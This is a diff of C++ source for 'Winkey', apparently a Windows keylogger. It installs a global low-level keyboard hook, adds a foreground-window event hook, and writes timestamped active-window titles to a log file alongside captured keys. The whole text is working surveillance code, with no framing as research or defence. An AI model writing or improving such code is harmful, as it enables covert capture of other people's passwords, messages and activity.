@@ -45,9 +45,28 @@ Winkey::~Winkey() {
 }
 
 int Winkey::Hook() {
-	HHOOK logger = SetWindowsHookExA(WH_KEYBOARD_LL, &Winkey::onKey, NULL, 0);
-	if (logger == nullptr) {
+	HHOOK kbdHook = SetWindowsHookExA(
+		WH_KEYBOARD_LL,
+		&Winkey::onKey,
+		NULL,
+		0
+	);
+	if (kbdHook == nullptr) {
 		std::cout << std::format("SetWindowsHookExA failed ({})\n", GetLastError());
+		return 1;
+	}
+
+	HWINEVENTHOOK winHook = SetWinEventHook(
+		EVENT_SYSTEM_FOREGROUND,
+		EVENT_SYSTEM_FOREGROUND,
+		NULL,
+		(WINEVENTPROC) & Winkey::onWindow,
+		0,
+		0,
+		WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS
+	);
+	if (winHook == nullptr) {
+		std::cout << std::format("SetWinEventHook failed ({})\n", GetLastError());
 		return 1;
 	}
 
@@ -75,6 +94,30 @@ LRESULT CALLBACK Winkey::onKey(int nCode, WPARAM wParam, LPARAM lParam) {
 
 	/* Forward to next hooks ... */
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
+/*
+	WINEVENTPROC onWindow;
+*/
+LRESULT CALLBACK Winkey::onWindow(HWINEVENTHOOK hWinEventHook,
+	DWORD event,
+	HWND hwnd,
+	LONG idObject,
+	LONG idChild,
+	DWORD idEventThread,
+	DWORD dwmsEventTime
+) {
+	(void)hWinEventHook;
+	(void)event;
+	(void)idObject;
+	(void)idChild;
+	(void)idEventThread;
+	(void)dwmsEventTime;
+
+	GetWindowText(hwnd, gLastWindowTitle, sizeof(gLastWindowTitle));
+	gReportNextWindow = true;
+
+	return 0;
 }
 
 const char *Winkey::solve(KBDLLHOOKSTRUCT *kbdEv) {
@@ -115,25 +158,21 @@ const char *Winkey::solve(KBDLLHOOKSTRUCT *kbdEv) {
 }
 
 void Winkey::logCurrentWindow() {
-	TCHAR	currentWindowTitle[512] = {0};
-
-	GetWindowText(GetForegroundWindow(), currentWindowTitle, sizeof(currentWindowTitle));
-
-	if (strcmp(gLastWindowTitle, currentWindowTitle) != 0) {
-		strcpy_s(gLastWindowTitle, currentWindowTitle);
-
-		std::time_t t = std::time(nullptr);
-		struct tm new_time;
-		localtime_s(&new_time, &t);
-
-		char mbstr[100 + sizeof(currentWindowTitle)] = {0};
-		std::strftime(mbstr, sizeof(mbstr), "%d.%m.%Y %H:%M:%S", &new_time);
-
-		const std::string to_write = std::format("[{}] - '{}'\n", mbstr, currentWindowTitle);
-
-		DWORD bytesWrote;
-		WriteFile(gLogHandle, to_write.c_str(), to_write.length(), &bytesWrote, NULL);
+	if (!gReportNextWindow) {
+		return;
 	}
+
+	std::time_t t = std::time(nullptr);
+	struct tm new_time;
+	localtime_s(&new_time, &t);
+
+	char mbstr[100 + sizeof(gLastWindowTitle)] = {0};
+	std::strftime(mbstr, sizeof(mbstr), "%d.%m.%Y %H:%M:%S", &new_time);
+
+	const std::string to_write = std::format("[{}] - '{}'\n", mbstr, gLastWindowTitle);
+
+	DWORD bytesWrote;
+	WriteFile(gLogHandle, to_write.c_str(), to_write.length(), &bytesWrote, NULL);
 }
 
 int __cdecl _tmain(int argc, TCHAR* argv[])
